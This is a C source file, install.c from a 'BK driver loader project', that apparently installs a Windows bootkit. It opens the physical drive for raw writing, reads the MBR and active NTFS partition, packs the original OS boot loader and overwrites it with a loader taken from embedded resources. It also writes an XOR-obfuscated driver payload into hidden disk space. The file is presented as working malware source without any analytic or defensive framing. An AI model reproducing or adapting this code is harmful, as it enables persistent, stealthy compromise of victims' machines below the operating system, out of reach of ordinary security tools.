//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2.
//	
// module: install.c
// $Revision: 67 $
// $Date: 2012-05-29 22:20:56 +0400 (Вт, 29 май 2012) $
// description: 
//	BK helper library. BK installation routines.

#include "main.h"
#include "aplib.h"
#include "bklib.h"
#include "fssup.h"
#include "install.h"

//#define		_SCSI_IO		// defines IO type: either SCSI PATH THROUGH or direct drive read/write.

#define		OP_JMP_SHORT		0xeb
#define		OP_JMP_NEAR			0xe9

#define		wszPartition					L"\\Device\\Harddisk0\\Partition%u"
#define		wszPhysicalDrive0				L"\\??\\PHYSICALDRIVE0"

#define		SCSI_IO_READ_SECTOR		1
#define		SCSI_IO_WRITE_SECTOR	2

#pragma warning(disable:4996)	// 'mbstowcs': This function or variable may be unsafe. Consider using mbstowcs_s instead. 


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates pseudo random number based on the specified seed value.
//
ULONG BkRandom(PULONG pSeed)
{
	return(*pSeed = 1664525*(*pSeed)+1013904223);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer using SCSI PATH THROUGH method.
//
static	BOOL	ScsiIo(
			   LPTSTR	Drive,		// drive name to read/write sectors from/to
			   PCHAR	Buffer,		// buffer to store the data
			   ULONG	Length,		// size of the buffer in bytes
			   ULONG	LBASector,	// starting LBA sector
			   ULONG	Count,		// number of sectors to read/write
			   ULONG	Flags		// variouse operation flags
			   )
{
	BOOL	Ret = FALSE;
	HANDLE		hDrive;
	WINERROR	Status;
	ULONG		bRead = 0, bLen = sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER);
	PSCSI_PASS_THROUGH_DIRECT Spt;
	PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER	Sptb;
	UCHAR	Direction, OpCode, OpCode16;

	if (Flags & SCSI_IO_WRITE_SECTOR)
	{
		Direction = SCSI_IOCTL_DATA_OUT;
		OpCode = SCSIOP_WRITE;
		OpCode16 = SCSIOP_WRITE16;
	}
	else
	{
		ASSERT(Flags & SCSI_IO_READ_SECTOR);
		Direction = SCSI_IOCTL_DATA_IN;
		OpCode = SCSIOP_READ;
		OpCode16 = SCSIOP_READ16;

	}	// if (Flags & SCSI_IO_READ)

	if (Spt = (PSCSI_PASS_THROUGH_DIRECT)malloc(bLen))
	{
		memset(Spt, 0, bLen);
		Sptb = (PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER)Spt;
		hDrive = CreateFile(Drive, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (hDrive != INVALID_HANDLE_VALUE)
		{
			Spt->Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
			Spt->PathId = 0;
			Spt->TargetId = 0; 
			Spt->Lun = 0; 
			Spt->CdbLength = 16; 
			Spt->SenseInfoLength = SPTWB_SENSE_LENGTH; 
			Spt->DataIn = Direction;
			Spt->DataTransferLength = Length; 
			Spt->TimeOutValue = 200; 
			Spt->DataBuffer = Buffer; 
			Spt->SenseInfoOffset = (ULONG)((PCHAR)&Sptb->SenseInfoBuffer - (PCHAR)Sptb);

			// Formating CDB16
			if (LOBYTE(LOWORD(GetVersion())) > 5)
				// Vista and highter
				Spt->Cdb16.OperationCode = OpCode16;
			else
				// XP and w2k3
				Spt->Cdb16.OperationCode = OpCode;

			Spt->Cdb16.ForceUnitAccess = TRUE;

			Spt->Cdb16.LogicalBlock[0] = HIBYTE(HIWORD(LBASector));
			Spt->Cdb16.LogicalBlock[1] = LOBYTE(HIWORD(LBASector));
			Spt->Cdb16.LogicalBlock[2] = HIBYTE(LOWORD(LBASector));
			Spt->Cdb16.LogicalBlock[3] = LOBYTE(LOWORD(LBASector));

			Spt->Cdb16.TransferLength[0] = HIBYTE(HIWORD(Count));
			Spt->Cdb16.TransferLength[1] = LOBYTE(HIWORD(Count));
			Spt->Cdb16.TransferLength[2] = HIBYTE(LOWORD(Count));
			Spt->Cdb16.TransferLength[3] = LOBYTE(LOWORD(Count));

			Spt->Cdb16.Control = 0x10;
   
			// Sending SRB block to the device
			Status = DeviceIoControl(hDrive, IOCTL_SCSI_PASS_THROUGH_DIRECT, Spt, bLen, Spt, bLen, &bRead, NULL);
			if ((Status) && bRead < bLen)
				Ret = TRUE;
			else
				Status = GetLastError();
		
			CloseHandle(hDrive);
		}	// if (hDrive != INVALID_HANDLE_VALUE)

		free(Spt);
	}
   
   return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer.
//
static	BOOL	DirectIo(
			   PWCHAR	Drive,			// drive name to read/write sectors from/to
			   PCHAR	Buffer,			// bufer to store the data
			   ULONG	Length,			// size of the buffer
			   ULONG	LBASector,		// starting LBA sector
			   ULONG	Count,			// number of sectors to read/write
			   ULONG	Flags			// variouse operation flags
			   )
{
	BOOL		Ret = FALSE;
	HANDLE		hDrive;
	NTSTATUS	ntStatus;
	OBJECT_ATTRIBUTES	oa = {0};
	UNICODE_STRING		us;
	IO_STATUS_BLOCK		IoStatus = {0};
	LARGE_INTEGER		FilePos = {0};
	HANDLE				hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	RtlInitUnicodeString(&us, Drive);
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
	{
		ntStatus = NtCreateFile(&hDrive, GENERIC_WRITE | GENERIC_READ, &oa, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL,
								FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);
	
		if (NT_SUCCESS(ntStatus))
		{
			FilePos.QuadPart = ((ULONGLONG)LBASector * BIOS_DEFAULT_SECTOR_SIZE);

			if (Flags & SCSI_IO_WRITE_SECTOR)
				ntStatus = NtWriteFile(hDrive, hEvent, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);
			else
				ntStatus = NtReadFile(hDrive, hEvent, NULL, NULL, &IoStatus, Buffer, (Count*BIOS_DEFAULT_SECTOR_SIZE), &FilePos, NULL);

			if (ntStatus == STATUS_PENDING)
				WaitForSingleObject(hEvent, INFINITE);

			NtClose(hDrive);

			if (NT_SUCCESS(IoStatus.Status))
				Ret = TRUE;
		}	// if (hDrive != INVALID_HANDLE_VALUE)
	}	// 	if ((Count * BIOS_DEFAULT_SECTOR_SIZE) <= Length)
 
   return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Reads or writes specified number of sectors from/to specified buffer.
//
static	BOOL  GetDriveGeometry(
						   PWCHAR			Drive,			// drive name to read/write sectors from/to
						   PDISK_GEOMETRY	DiskGeometry
			   )
{
	BOOL	Ret = FALSE;
	UNICODE_STRING	uDrive;

	RtlInitUnicodeString(&uDrive, Drive);
	if (NT_SUCCESS(BkGetDriveGeometry(&uDrive, DiskGeometry)))
		Ret = TRUE;
 
   return(Ret);
}


#define	ScsiReadSectors(Drive, Buffer, Length, Sector, Count)	ScsiIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_READ_SECTOR)
#define	ScsiWriteSectors(Drive, Buffer, Length, Sector, Count)	ScsiIo(Drive, Buffer, Length, Sector, Count, SCSI_IO_WRITE_SECTOR)


BOOL DirectReadSectors(PWSTR Drive, PCHAR Buffer, ULONG Length, ULONG Sector, ULONG Count)
{
	BOOL	Ret = FALSE;
	UNICODE_STRING	uDrive;

	RtlInitUnicodeString(&uDrive, Drive);
	if (NT_SUCCESS(BkReadSectors(&uDrive, Buffer, Length, (ULONGLONG) Sector, Count)))
		Ret = TRUE;
	return(Ret);

}


BOOL DirectWriteSectors(PWSTR Drive, PCHAR Buffer, ULONG Length, ULONG Sector, ULONG Count)
{
	BOOL	Ret = FALSE;
	UNICODE_STRING	uDrive;

	RtlInitUnicodeString(&uDrive, Drive);
	if (NT_SUCCESS(BkWriteSectors(&uDrive, Buffer, Length, (ULONGLONG) Sector, Count)))
		Ret = TRUE;
	return(Ret);

}



#ifdef	_SCSI_IO
	#define	ReadSectors(a, b, c, d, e)	ScsiReadSectors(a, b, c, d, e)
	#define	WriteSectors(a, b, c, d, e)	ScsiWriteSectors(a, b, c, d, e)
#else
	#define	ReadSectors(a, b, c, d, e)	DirectReadSectors(a, b, c, d, e)
	#define	WriteSectors(a, b, c, d, e)	DirectWriteSectors(a, b, c, d, e)
#endif



//
//	Packs specified source buffer of the specified size with binary data.
//	Stores packed data into the destination buffer. Returns destination buffer size.
//
static	ULONG	ApPack(
	 PCHAR SrcBuffer,		// source buffer
	 ULONG SrcLen,			// source buffer size
	 PCHAR* pDstBuffer		// destination buffer
	 )
{
	ULONG	wLen, pLen, PackedLen = 0;
	PCHAR	Packed = NULL, WorkSet = NULL;

	wLen = aP_workmem_size(SrcLen);
	pLen = aP_max_packed_size(SrcLen);

	if (Packed = vAlloc(wLen + pLen))
	{
		WorkSet = Packed + pLen;
		memset(Packed, 0, pLen);

		if (PackedLen = aP_pack(SrcBuffer, Packed, SrcLen, WorkSet, NULL, NULL))
			*pDstBuffer = Packed;
		else
			vFree(Packed);
	}	// if (Packed = vAlloc(wLen + pLen))

	return(PackedLen);
}


//
//	Tries to find the IPL entry point.
//	Looking for the first instruction within the IPL. It should be "JMP SHORT" or "JUMP NEAR" to the loader code
//
static	ULONG GetCodeOffset(
	PUCHAR	Loader	// buffer containing NTFS IPL code
	)
{
	ULONG	i;

	// Skipping loader header
	i = NTFS_LDR_HEADER_SIZE;

	// Skipping zeroes
	while (i < BIOS_DEFAULT_SECTOR_SIZE && (Loader[i] == 0))
		i += 1;

	// Checking the first instruction
	if (Loader[i] == OP_JMP_SHORT)
		i += Loader[i+1] + 2;
	else if (Loader[i] == OP_JMP_NEAR)
		i += *(PUSHORT)&Loader[i+1] + 3;
	else
		i = 0;

	return(i);
}


//
//	Packs original OS loader and creates a new one containing BK and the packed one.
//
static	BOOL BkCreateLoader2(
	PCHAR	BootLoader,		// BK initial loader binary
	ULONG	BootSize,		// size of the BK loader
	PCHAR	Original,		// original NT loader
	ULONG	OriginalSize,	// length of the original NT loader
	PCHSS	TargetAddress	// target driver CHSS address
	)
{
	BOOL	Ret = FALSE;
	ULONG	PackedSize;
	PCHAR	Packed;

	if (PackedSize = ApPack(Original, OriginalSize, &Packed))
	{
		if ((BootSize + PackedSize) <= OriginalSize)
		{
			ULONG i;
			memcpy(Original, BootLoader, BootSize);

			for (i=0; i<BootSize; i++)
			{
				if (Original[i] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&Original[i]) == BK_NAME_MAGIC))
					break;
			}	// for (i=0;i<VbrLen;i++)

			if (i < BootSize)
			{
				ULONG	c;
				// The XorValue stored as the second dword within the CHSS structure 
				USHORT	XorValue = *(PUSHORT)(&Original[i] + sizeof(ULONG));

				memcpy(&Original[i], TargetAddress, sizeof(CHSS));		

				// Xoring file address and size structure
				for (c=0; c<(sizeof(CHSS)/2); c++)
					*((PUSHORT)&Original[i] + c) ^= XorValue;

				memcpy(Original + BootSize, Packed, PackedSize);
				Ret = TRUE;
			}	// if (i < VbrLen)
		}	// if ((VbrLen + PackedLen) >= BufferLen)
		vFree(Packed);
	}	// if (PackedSize = ApPack(Original, CodeSize, &Packed))
	
	return(Ret);
}

//
//	Packs original OS loader and creates a new one containing BK and the packed one.
//
static	BOOL	BkCreateLoader(
	PCHAR	Buffer,			// buffer to store newly created loader
	ULONG	BufferLen,		// length of the buffer in bytes
	PCHAR	Packed,			// packed part of the loader
	ULONG	PackedLen,		// length of the packed part in bytes
	PCHSS	TargetAddress	// target driver CHSS address
	)
{
	BOOL	Ret = FALSE;
	HRSRC	hRs;
	HGLOBAL hRes;

	// Resolving current module base
	MEMORY_BASIC_INFORMATION	MemInfo = {0};
	VirtualQuery(&BkCreateLoader, &MemInfo, sizeof(MEMORY_BASIC_INFORMATION));

	// Loading BK from module resources
	hRs = FindResource(MemInfo.AllocationBase, _T("VBR"), RT_RCDATA);

	if (hRs && (hRes = LoadResource(MemInfo.AllocationBase, hRs)))
	{
		PCHAR	Vbr = (PCHAR)LockResource(hRes);
		ULONG	VbrLen = SizeofResource(MemInfo.AllocationBase, hRs);

		if ((VbrLen + PackedLen) <= BufferLen)
		{
			ULONG i = 0;
			memcpy(Buffer, Vbr, VbrLen);

			for (i=0;i<VbrLen;i++)
			{
				if (Buffer[i] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&Buffer[i]) == BK_NAME_MAGIC))
					break;
			}	// for (i=0;i<VbrLen;i++)


			if (i < VbrLen)
			{
				ULONG	c;
				// The XorValue stored as the second dword within the CHSS structure 
				USHORT	XorValue = *(PUSHORT)(&Buffer[i] + sizeof(ULONG));

				memcpy(&Buffer[i], TargetAddress, sizeof(CHSS));		

				// Xoring file address and size structure
				for (c=0; c<(sizeof(CHSS)/2); c++)
					*((PUSHORT)&Buffer[i] + c) ^= XorValue;

				memcpy(Buffer + VbrLen, Packed, PackedLen);
				Ret = TRUE;
			}	// if (i < VbrLen)
		}	// if ((VbrLen + PackedLen) >= BufferLen)
	}	// if (hRs && (hRes = LoadResource(NULL, hRs)))

	return(Ret);
}


//
//	Searches for a free (unpartitioned) space within the system volume and writes the BK-payload (driver) into it.
//
static WINERROR	BkInstallPayloadFromBuffer(
	PCHAR	Payload,		// Buffer containing the BK-payload (driver) code
	ULONG	PayloadSize,	// Size of the buffer in bytes
	PCHSS	PayloadAddress	// Structure that receives sector address and size of the BK-payload written to the disk.
	)
{
	WINERROR	Status = NO_ERROR;
	ULONG	i, bSize = BIOS_DEFAULT_SECTOR_SIZE;
	ULONG	StartSector = 0, EndSector = 0, SectorSize = 0, PackedSize = 0;
	PWCHAR	TargetDrive = wszPhysicalDrive0;

	PCHAR	PayloadSectors = NULL;
	ULONG	PayloadSecSize, PayloadBufSize;

	UNICODE_STRING	FsDrive;
	BK_FS_AREA	FsArea = {0};
	PCHAR		WorkBuffer;	

	RtlInitUnicodeString(&FsDrive, TargetDrive);

	do	// not a loop
	{
		if (!Payload || !PayloadAddress || !PayloadSize)
		{
			Status = ERROR_INVALID_PARAMETER;
			break;
		}

		if (!(WorkBuffer = vAlloc(PAGE_SIZE)))
		{
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		FsArea.pDeviceName = &FsDrive;
		i = BkAllocateFsArea(&FsArea, WorkBuffer);
		vFree(WorkBuffer);

		if (!NT_SUCCESS(i))
		{
			Status = ERROR_DISK_FULL + 10000;
			break;
		}

		if (FsArea.BytesPerSector != BIOS_DEFAULT_SECTOR_SIZE)
		{
			Status = ERROR_BAD_FORMAT;
			break;
		}

		// Calucating the size of the FS reserved area
		i = (FsArea.NumberOfSectors - BK_FS_RESERVED_SECTORS - BK_FS_NUMBER_FATS);
		i = (i + (BIOS_DEFAULT_SECTOR_SIZE / sizeof(USHORT)) - 1) / (BIOS_DEFAULT_SECTOR_SIZE / sizeof(USHORT));
		// Calculating Payload start sector
		StartSector = i * BK_FS_NUMBER_FATS + BK_FS_RESERVED_SECTORS + BK_FS_SECTORS_PER_ROOT;

		PayloadSecSize =  (PayloadSize + (BIOS_DEFAULT_SECTOR_SIZE -1))/BIOS_DEFAULT_SECTOR_SIZE;
		PayloadBufSize = PayloadSecSize * BIOS_DEFAULT_SECTOR_SIZE;

		if ((StartSector + PayloadSecSize) > FsArea.NumberOfSectors)
		{
			// Not enough disk space to store the payload
			Status = ERROR_DISK_FULL + 20000;
			break;
		}

		if (!(PayloadSectors = vAlloc(PayloadBufSize)))
		{
			// Not enough memory
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		memcpy(PayloadSectors, Payload, PayloadSize);
		StartSector += (ULONG)FsArea.StartSector;

		// Calculating Start sector CHSS address
		PayloadAddress->StartSector.QuadPart = (ULONGLONG)StartSector;
		PayloadAddress->NumberSectors = (USHORT)(BK_FS_BOOT_FILE_SIZE / BIOS_DEFAULT_SECTOR_SIZE);
		PayloadAddress->XorValue = GetTickCount();

		bSize = BK_FS_BOOT_FILE_SIZE / sizeof(ULONG);

		for (i=0; i<(PayloadBufSize / sizeof(ULONG)); i++)
		{
			ULONG	Xored = ((PULONG)PayloadSectors)[i];
			Xored = _rotl(((Xored + bSize) ^ PayloadAddress->XorValue), (UCHAR)bSize);
			((PULONG)PayloadSectors)[i] = Xored;
			bSize -= 1;
		}

		// Writing payload to the disk
		if (WriteSectors(TargetDrive, PayloadSectors, PayloadBufSize, StartSector, PayloadSecSize))
		{
			DbgPrint("BKSETUP: Payload of %u bytes successfully written at sector %x.\n", PayloadSize, StartSector);
		}
		else
		{
			Status = ERROR_WRITE_FAULT;
		}
	} while(FALSE);


	if (PayloadSectors) 
		vFree(PayloadSectors);

	return(Status);
}



//
//	Searches for the system Volume Boot Record and installs the BK-loader into it.
//
static WINERROR BkInstallVbr(
	PCHAR	BootLoader,		// BK-loader code 
	ULONG	BootSize,		// Size of the BK-loader code in bytes
	PCHSS	PayloadAddress	// Structure that specifies BK-payload address and size
	)
{
	WINERROR	Status = NO_ERROR;
	PCHAR	Vbs	= NULL, Loader = NULL, Packed = NULL;
	PVBR	Vbr = NULL;
	ULONG	i, CodeSize, bSize = BIOS_DEFAULT_SECTOR_SIZE;
	PPARTITION_TABLE	PTable;
	ULONG	StartSector = 0, SectorSize = 0, PackedSize = 0;
	WCHAR	TargetDrive[cstrlenW(wszPartition) + 1] = {0};

	wsprintfW(TargetDrive, wszPartition, 0);
	
	do	// not a loop
	{
		if (!(Vbs = vAlloc(BIOS_DEFAULT_SECTOR_SIZE)))
		{
			// Not enough memory
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Reading MBR sector
		if (!ReadSectors(TargetDrive, Vbs, bSize, 0, 1))
		{
			// Reading failed 
			Status = ERROR_READ_FAULT + 10000;
			break;
		}

		// Check out we read a right one
		if (*(PUSHORT)(Vbs + BIOS_DEFAULT_SECTOR_SIZE - sizeof(USHORT)) != BIOS_MBR_MAGIC)
		{
			// Wrong or corrupt sector loaded
			Status = ERROR_UNRECOGNIZED_VOLUME;
			break;
		}

		// Here we read the Driver Boot sector and searching for the Volume boot sector within it

		PTable = (PPARTITION_TABLE)(Vbs + BIOS_PARTITION_TABLE_OFFSET);
		i = 0;
		
		while(
			(i < BIOS_MAX_PARTITION_COUNT) && 
			(!(PTable->Entry[i].ActiveFlag & BIOS_PARTITION_ACTIVE_FLAG) || 
			(PTable->Entry[i].Descriptor != BIOS_PARTITION_TYPE_INSTALLABLE)))
			i += 1;

		if (i == BIOS_MAX_PARTITION_COUNT)
		{
			// No bootable NTFS partition found
			Status = ERROR_BAD_FORMAT + 10000;
			break;
		}
		
		bSize = BIOS_DEFAULT_SECTOR_SIZE;

#ifdef	_PHYSICAL_DRIVE
		StartSector = PTable->Entry[i].LBAStartSector;
#else
		wsprintfW(TargetDrive, wszPartition, (i + 1));
		StartSector = 0;
#endif

		if (!ReadSectors(TargetDrive, Vbs, bSize, StartSector, 1))
		{
			// Reading failed
			Status = ERROR_READ_FAULT + 20000;
			break;
		}


		Vbr = (PVBR)Vbs;
		if (memcmp(&Vbr->VolumeOemId, NTFS_OEM_ID, sizeof(NTFS_OEM_ID)))
		{
			// Not a NTFS partition
			Status = ERROR_NOT_SUPPORTED;
			break;
		}

		SectorSize = Vbr->Bpb.SectorSize;
		ASSERT(SectorSize == BIOS_DEFAULT_SECTOR_SIZE);

		bSize = (NTFS_LOADER_SIZE * SectorSize);
		if (!(Loader = vAlloc(bSize)))
		{
			// Not enough memory
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		if (!ReadSectors(TargetDrive, Loader, bSize, (StartSector + 1), (NTFS_LOADER_SIZE - 1)))
		{
			// Reading failed
			Status = ERROR_READ_FAULT + 30000;
			break;
		}

		if (!(i = GetCodeOffset(Loader)))
		{
			// Wrong or corrupt OS loader
			Status = ERROR_BAD_FORMAT + 20000;
			break;
		}

		CodeSize = (NTFS_LOADER_SIZE - 1) * SectorSize - i;

		if (!BkCreateLoader2(BootLoader, BootSize, Loader + i, CodeSize, PayloadAddress))
		{
			// Failed to create loader
			Status = ERROR_FILE_INVALID;
			break;
		}

		if (!WriteSectors(TargetDrive, Loader, bSize, (StartSector + 1), (NTFS_LOADER_SIZE - 1)))
		{
			Status = ERROR_WRITE_FAULT;
		}
		
	} while(FALSE);

	if (Vbs)
		vFree(Vbs);

	if (Loader)
		vFree(Loader);

	if (Packed)
		vFree(Packed);

	return(Status);
}


//
//	Writes the BK-payload (driver) to the disk sectors and installs BK-loader.
//
ULONG _stdcall BkSetupWithPayload(
	PCHAR	BootLoader,		// BK-loader code
	ULONG	BootSize,		// Size of the BK-loader in bytes
	PCHAR	Payload,		// Payload code (driver)
	ULONG	PayloadSize		// Size of the payload in bytes
	)
{
	WINERROR	Status;
	CHSS		PayloadAddress = {0};

	// Trying to write the payload first
	if ((Status = BkInstallPayloadFromBuffer(Payload, PayloadSize, &PayloadAddress)) == NO_ERROR)
	{
		// now installing the BK-loader
		if ((Status = BkInstallVbr(BootLoader, BootSize, &PayloadAddress)) != NO_ERROR)
			Status += 200000;
	}
	else
		Status += 100000;	// To mark en error occured within BkInstallPayloadFromBuffer() function.
	
	return(Status);
}